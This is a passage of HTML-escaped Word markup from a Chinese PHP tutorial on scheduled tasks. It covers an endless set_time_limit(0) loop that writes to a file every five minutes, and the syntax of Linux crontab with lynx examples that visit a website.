0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;PHP&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;脚本也可以继续执行&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;.&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;set_time_limit(0);// &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;执行时间为无限制，&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;php&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;默认的执行时间是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;30&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;秒，通过&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;set_time_limit(0)&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;可以让程序无限制的执行下去&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;$interval=60*5;// &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;每隔&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;分钟运行&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;do{&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;$fp =fopen(''test.txt'',''a'');&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;fwrite($fp,''test'');&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;fclose($fp);&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;sleep($interval);// &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;等待&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;分钟&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;}while(true);&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;?&amp;gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;只要运行上面的页面，然后关掉，程序就会一直运行下去。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;Linux &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;下有种更简单的方法，就是&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;命令&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;命令的功能是在一定的时间间隔调度一些命令的执行。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;使用方法：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; crontab [-e | -l | -r ] &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;文件名&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; -e:&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;编辑任务&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; -l:&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;显示任务信息&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; -r:&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;删除定时执行任务信息&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;的格式：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;* &amp;nbsp;*&amp;nbsp; * &amp;nbsp;* &amp;nbsp;* &amp;nbsp;Command&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;分&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;时&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;日&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;月&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;星期&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; &lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;要运行的命令&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;crontab&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;的例子：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;*/5 * * ** &amp;nbsp;lynx http://www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;每&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;分钟访问一次&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;0 8 * * *&amp;nbsp;lynx http://www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;每天早上&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-size:9.0pt;font-family:宋体;mso-ascii-font-family:arial;mso-hansi-font-family:arial;mso-bidi-font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;点访问&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt; www.php100.com&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:18.75pt;mso-pagination:widow-orphan;background:#eff4fa;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:9.0pt;font-family:arial;border:none windowtext 1.0pt;mso-border-alt:none windowtext 0cm;padding:0cm;mso-font-kerning:0pt;&quot;&gt;&amp;nbsp;&lt;o :p&gt;&lt;/o 